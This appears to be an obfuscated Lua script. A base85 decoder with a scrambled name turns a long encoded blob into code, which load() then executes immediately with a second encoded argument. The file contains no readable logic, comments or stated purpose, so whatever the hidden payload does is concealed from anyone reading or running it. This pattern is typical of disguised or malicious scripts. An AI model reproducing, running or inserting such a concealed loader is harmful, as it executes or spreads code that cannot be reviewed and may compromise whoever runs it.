
local function VRKMecLwhy(s)
    local m = {}
    local c = "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz!#$%&()*+-;<=>?@^_`{|}~"
    for i=1,85 do m[string.byte(c,i)] = i-1 end
    local o, v, n, p = {}, 0, 0, {52200625, 614125, 7225, 85, 1}
    for i=1, #s do
        local x = m[string.byte(s,i)]
        if x then
            v = v + x * p[n+1]
            n = n + 1
            if n == 5 then
                table.insert(o, string.char(math.floor(v/16777216), math.floor((v%16777216)/65536), math.floor((v%65536)/256), v%256))
                v, n = 0, 0
            end
        end
    end
    return table.concat(o)
end
assert(load(VRKMecLwhy("3LqdLAZ%}AVQe5-MrlDuSVK^0K_ERKb98cPZf7oIXkl_FI5RCVH!L_fEipMPI5R6VI4m|cD>FDOF)=bNGBqqSH7heSEHN-LD>5)FF*PwQGcznTF)K1PEHN`UEi*SPF)%bOGd3(aIW00aEHN=OEi*MNGBqnSF)T4LHZ3$WEHODNGdL_UGBqtSI4m(VI4v_XEHN=NEipDMIWsLWI4m(VGA%PVEI2ePGcznSG%GVOEHyMMGBPYPHY+qUEIBqUGBzwRIV&?aEIBzXG&3wQFf=VPG%PnWD>N`HGc_wQH7q$XD>5}H3LqdLAZ%}AVQe5~b#7yHX>V>IZbV^BVsUO|cU351EMh4jY;R*>Y#?wfV?8k}FgqZ3XlZO^AYnc*AYpD~AYwi+AY^YKY;R*>Y#?%BEOKH!VI?vwVkI&=AZcbGa$$Zwa$+EKXk~67V?ARla3E!FWIG^XEMhEhJt$!<a$zYiGAt-!EplQhFET7}Dl$7DWo~3UAZcbGVLW0WbZBL6AYnaXAZ2c3J0N#xX>4U6VLmV*WN#pBZ)0I>AaY?nVI?v<AZcbGa$!C&AarPDZXjblV=HhVWo~3UAYm+UJt$!<a$zYiGAwW^GCLq;Ze%+ka%FUNa&91FJ0N9lWIGBVARr)YZ)0I>AZB%LV{~b6ZXiu$Vn}3WYIagXC}b=kYbgpKARr(hARr)YZ)0I>Aafu+AbWivW^ZyJX+1D3GBq_IWN#pITWMWAX&_~8WC|c4ARr(hARugSV_|F{Y9KuzFbW_bARr(hARuOMav*6vFf1}PH6Ubf3LqdLARr(hARr(hAZj2zASh}eD<E@QX<Z;IAaitbX>MmOVtI6BC~GVrC}|)iAR}ujAS)m-DJdW&ATl*J3LqdLARr(hARr(hAah%3T`VATTWVb(Js@*iYF#WKb6aU$3LqdLARr(hAZ2c33LqdLARr(hAZ%}AVQe62EFf=nbRaz-Ff1T@eF`8TARr(hARuZWJs>a&ARr(hARr(hW^ZyJX=HdkF)Sb>WFTa33LqdLARr(hARr(hAZZ{yASh`dD<Cl`ASEC&H8u($ARr(hARr(hARr)WAUz-`Y9K2hb6aU$DIg^vGBq{|ARr(hARr(hARr(hb6aU$EFg1RYF!{bAah%4T`VATTWMViARr(hARr(hARr(hZ*_EABX4zdD=}RlJs@**a%pa7E@Nn6awu*@VN7CiZe@2>D06gjX>MmOVtI6BC}b=kX=HdQEFg1RD05qBT_7tUb6aX%DIg^vGBq|`DJcpdARr(hARr)RZe$7|ARr(hARr)eWps6NZXk4FVr*qDV{dL_VRR^Ob#y5TARr(hWo~2&ARr(ha%FUNa&91Ib#7yHX>V>Qa9?6LH7N=pARr(hARr)YZ)0I>AZ=lAAUz;^eF`8TARr(hARugSV_|F{V`yP=b09q+A}}#BGc+|eH#j*#LPJDFMn_0VN=r;lPESx#Qd3k_R##YAT47>iWMyV&XlZI|Y;A6DaB*^Tbai%jczJpuBP1mzC@Cr{Ejv6tK0iQSUtoKDeSRVeARr(hARr(hW^ZyJX+1G4I5i+-Zy;@9a9eY9a%pa7E@F9fWhi54VRCaUX(?SGJs@c<F(74bWC|c4ARr(hARugSV_|F{Z*_DmAa-GFEFfcVb#8PZJs^91EFdr}ATSCbARr(hARr)YZ)0I>AaHMYb09q+do?mLFfcYUH7p=DF*GqUH7p=EGBPzRAUHKFATfOkARr(hARr(hW^ZyJX+1G4AR};JVmLJ*WN!)}ARr(hARr(hARr)YZ)0I>Aa)=<AZ=lATXS@BX>MmOVtI6BC~#k5I5jLFX(?R_ARr(hARr(hARr(hX=WgHAarPDZVDhEARr(hARr(hARr(hARu;OY#==#c42HFD<F0tDj;xgcXL}~Z*^{TD=}RPARr(hARr(hARr(hARr(hV{dhCbRaz-V{dhCbRa7rF$y3cARr(hARr(hARr(hARuXGAY*TJZge0$Js>q8bZBL63LqdLARr(hARr(hARr(hARr(hAar43Y-KKKZgXXFbSQ6ibSxlqbaH8KXD(xCVR9&KVRUFNW^8Y7awv9TY%ei3H#avjF*YeIAZ=lEXf9@KZ*OuaD0X3NB{4QPH#agdHYqPQH8nFfDJ&puVRUFNW^8Y7awsTvVQeKfH8nFfDK9cLHYqG1c42HKGBq|SDGDGUARr(hARr(hARr(hARr(hARu;OY%CySZ*^{TAUz;3EFdrnARr(hARr(hARr(hARr(hWo~2&ARr(hARr(hARr(hWo~2&ARr(hARr(hWo~2&ARr(hARr(hY;R*>Y#?N1V{&<LbY)~9Js?eFVn}3WYIagXD0E?BY-KKEZ*F5@bSQ6ibSW$#Sw?9=M_5BpX+bFpARr(hARr(hVRLh3a&#zcZ((F8WMyM=d2n=PWGN{qDGDGUARuLKWC|c4ARq")))()("q=di<y5K~4+3K;(x7z;_>Qz)cBCR($fXeD@O^lrE<3q<KXXvNQJf+18i1&R28Ixy($qX;H?l%2!k4*jLjd>jf-$|HZpcZgtZ#tOz4)M9&`@JZn*}&la")
